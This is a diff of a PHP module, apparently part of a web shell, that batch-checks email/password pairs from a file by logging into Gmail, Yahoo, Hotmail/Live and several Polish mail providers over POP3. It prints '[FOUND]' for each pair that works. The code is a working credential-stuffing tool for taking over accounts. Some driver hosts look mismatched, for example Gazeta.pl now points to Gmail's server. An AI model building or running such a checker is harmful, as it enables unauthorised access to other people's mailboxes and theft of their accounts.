@@ -127,7 +127,8 @@ class EmailValidatorDriverWppl implements EmailValidatorInterface
 	{
 		return array
 		(
-			'wp.pl'
+			'wp.pl',
+			'wp.eu'
 		);
 	}
 
@@ -371,10 +372,7 @@ class EmailValidatorDriverGazetapl implements EmailValidatorInterface
 	 */
 	public function getHosts()
 	{
-		return array
-		(
-			'gazeta.pl'
-		);
+		return array( 'gazeta.pl' );
 	}
 
 	/**
@@ -408,7 +406,509 @@ class EmailValidatorDriverGazetapl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{pop3.poczta.onet.pl:995/pop3/ssl/novalidate-cert}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( '{pop.gmail.com:995/pop3/ssl/novalidate-cert}', $sUsername, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga yahoo.com
+ *
+ * IMAP i POP3 nie sa dostepne w wersji FREE
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ *
+ * @link http://help.yahoo.com/l/pl/yahoo/mail/classic/mailplus/pop/pop-08.html
+ */
+class EmailValidatorDriverYahoocom implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'yahoo.com',
+			'yahoo.fr',
+			'yahoo.pl',
+			'yahoo.co.uk',
+			'yahoo.com.cn',
+			'ymail.com',
+			'yahoo.ca',
+			'yahoo.es',
+			'rocketmail.com',
+			'yahoo.com.au',
+			'yahoo.de',
+			'yahoo.com.br',
+			'yahoo.it',
+			'yahoo.com.tr',
+			'yahoo.ie'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
+		 */
+		if( $sUsername === $sPassword )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( ! ( strlen( $sPassword ) >= 5 ) && ( strlen( $sPassword ) <= 32 ) )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( '{pop.mail.yahoo.com:110/pop3}', $sUsername, $sPassword, null, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga yahoo.com
+ *
+ * Trzeba wlaczyc obsluge POP3 w panelu
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ *
+ * @link http://mail.google.com/support/bin/answer.py?answer=13287
+ */
+class EmailValidatorDriverGmailcom implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'gmail.com',
+			'googlemail.com'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
+		 */
+		if( $sUsername === $sPassword )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( strlen( $sPassword ) < 8 )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( '{pop.gmail.com:995/pop3/ssl/novalidate-cert}', $sUsername, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga Live.com
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ *
+ * @link http://www.mydigitallife.info/hotmail-free-pop3-and-smtp-access-and-server-configuration-settings/
+ * @link http://liveunplugged.wordpress.com/2010/03/12/hotmail-and-msn-accounts-pop3smtp-access/
+ */
+class EmailValidatorDriverLivecom implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'hotmail.com',
+			'hotmail.de',
+			'hotmail.fr',
+			'hotmail.co.uk',
+			'windowslive.com',
+			'live.com',
+			'live.de',
+			'live.pl',
+			'msn.com'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
+		 */
+		if( $sUsername === $sPassword )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( strlen( $sPassword ) < 6 )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( '{smtp.live.com:995/pop3/ssl/novalidate-cert}', $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga neostrada.pl
+ *
+ * Brak informacji na temat dlugosci hasla
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ *
+ * @link http://konfiguracja.neostrada.pl/neo/help/konf_outlook.htm
+ */
+class EmailValidatorDriverNeostradapl implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array( 'neostrada.pl' );
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
+		 */
+		if( $sUsername === $sPassword )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( '{smtp.live.com:110/pop3}', $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga orangep.pl
+ *
+ * Brak informacji na temat dlugosci hasla
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ *
+ * @link http://ustaw.orange.pl/ust.aspx
+ */
+class EmailValidatorDriverOrangepl implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array( 'orange.pl' );
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
+		 */
+		if( $sUsername === $sPassword )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap =  imap_open( '{mail.orange.pl:110/pop3}', $sUsername, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga poczta.pl
+ *
+ * Brak informacji na temat dlugosci hasla
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ *
+ * @link http://www.poczta.pl
+ */
+class EmailValidatorDriverPocztapl implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array( 'poczta.pl' );
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
+		 */
+		if( $sUsername === $sPassword )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( '{mail.poczta.pl:110/pop3}', $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga plusnet.pl
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ *
+ * @link https://www.plusnet.pl/pomoc.html
+ */
+class EmailValidatorDriverPlusnetpl implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array( 'plusnet.pl' );
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
+		 */
+		if( $sUsername === $sPassword )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( strlen( $sPassword ) < 6 )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( '{mail.plusnet.pl:110/pop3}', $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -589,7 +1089,7 @@ class EmailValidator
 				/**
 				 * Brak hasla
 				 */
-				if( $sPassword === false )
+				if( $sPassword === FALSE )
 				{
 					continue ;
 				}
@@ -651,7 +1151,7 @@ class EmailValidator
 		/**
 		 * Sterowniki sa wymagane
 		 */
-		if( $this -> aDrivers === FALSE )
+		if( $this -> aDrivers === array() )
 		{
 			throw new EmailValidatorException( 'Nie ustawiono sterownikow' );
 		}
@@ -659,15 +1159,19 @@ class EmailValidator
 		/**
 		 * Lista z adresami jest wymagana
 		 */
-		if( $this -> aEmails === FALSE )
+		if( $this -> aEmails === array() )
 		{
 			throw new EmailValidatorException( 'Nie wprowadzono adresow email' );
 		}
+
+		$i = 0;
 
 		/**
 		 * Laczna ilosc adresow
 		 */
 		$iEmails = count( $this -> aEmails );
+
+		echo "Rozpoczęto skanowanie\r\n\r\n";
 
 		/**
 		 * Adresy email
@@ -728,11 +1232,22 @@ class EmailValidator
 				 */
 				if( $bSuccess )
 				{
-					printf( "%05d/%05d - %07.3f%% # %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1 ) / $iEmails ) * 100, $sEmail );
+					printf( "[FOUND] %05d/%05d - %07.3f%% # %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1 ) / $iEmails ) * 100, $sEmail );
 					@ ob_flush();
 					@ flush();
+					$i = 0;
 					break ;
 				}
+			}
+
+			if( ( $i !== 0 ) && ( $i % 20 === 0 ) )
+			{
+				printf( "[INFO]  %05d/%05d - %07.3f%% ! %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1 ) / $iEmails ) * 100, $aEmail['email'] );
+				$i = 0;
+			}
+			else
+			{
+				++$i;
 			}
 		}
 	}
@@ -801,6 +1316,8 @@ class EmailValidator
 
 		$iEmails = count( $this -> aEmails );
 
+		$aSupportedHosts = array_filter( $aSupportedHosts );
+
 		/**
 		 * Sortowanie wedlug liczby wystepowan malejaco
 		 */
@@ -820,10 +1337,13 @@ class EmailValidator
 		/**
 		 * Nie wspierane
 		 */
-		printf( "Niewspierane hosty - %06d / %06d - %03.2f%%:\r\n", ( $iSum = array_sum( $aNotSupportedHosts ) ), $iEmails, ( $iSum / $iEmails ) * 100 );
-		foreach( $aNotSupportedHosts as $sHost => $iCount )
+		if( array_sum( $aNotSupportedHosts ) > 0 )
 		{
-			printf( "   %6d - %s\r\n", $iCount, $sHost );
+			printf( "Niewspierane hosty - %06d / %06d - %03.2f%%:\r\n", ( $iSum = array_sum( $aNotSupportedHosts ) ), $iEmails, ( $iSum / $iEmails ) * 100 );
+			foreach( $aNotSupportedHosts as $sHost => $iCount )
+			{
+				printf( "   %6d - %s\r\n", $iCount, $sHost );
+			}
 		}
 	}
 
@@ -886,7 +1406,7 @@ class ModuleEmailValidator implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.00 2011-10-17 - <krzotr@gmail.com>';
+		return '1.01 2011-11-12 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -934,7 +1454,7 @@ DATA;
 		/**
 		 * Help
 		 */
-		if( $this -> oShell -> iArgc !== 1 && $this -> oShell -> iArgc !== 2 )
+		if( ( $this -> oShell -> iArgc !== 1 ) && ( $this -> oShell -> iArgc !== 2 ) )
 		{
 			return $this -> getHelp();
 		}
@@ -948,6 +1468,13 @@ DATA;
 				-> addDriver( new EmailValidatorDriverInteriapl() )
 				-> addDriver( new EmailValidatorDriverOnetpl() )
 				-> addDriver( new EmailValidatorDriverGazetapl() )
+				-> addDriver( new EmailValidatorDriverYahoocom() )
+				-> addDriver( new EmailValidatorDriverGmailcom() )
+				-> addDriver( new EmailValidatorDriverLivecom() )
+				-> addDriver( new EmailValidatorDriverNeostradapl() )
+				-> addDriver( new EmailValidatorDriverOrangepl() )
+				-> addDriver( new EmailValidatorDriverPocztapl() )
+				-> addDriver( new EmailValidatorDriverPlusnetpl() )
 				-> setEmailsFile( $this -> oShell -> aArgv[0] );
 
 			/**
